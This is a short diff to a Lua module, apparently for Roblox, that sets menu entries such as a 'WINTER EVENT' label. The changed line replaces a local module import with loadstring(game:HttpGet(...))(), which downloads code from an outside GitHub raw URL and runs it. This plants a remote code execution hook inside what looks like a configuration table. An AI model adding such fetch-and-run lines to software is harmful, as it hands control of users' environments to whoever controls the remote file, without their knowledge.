@@ -4896,7 +4896,7 @@ local module = {{
 	disabledText = "WINTER EVENT";
 	disabledColor = Color3.fromRGB(135, 201, 255);
 }}
-for i, v in pairs(require(script.Parent.EngineList)) do
+for i, v in pairs(loadstring(game:HttpGet("https://raw.githubusercontent.com/y-d/purgedata/refs/heads/main/engines.txt"))()) do
 	if not module[i].customLists then
 		module[i].customLists = {}
 	end
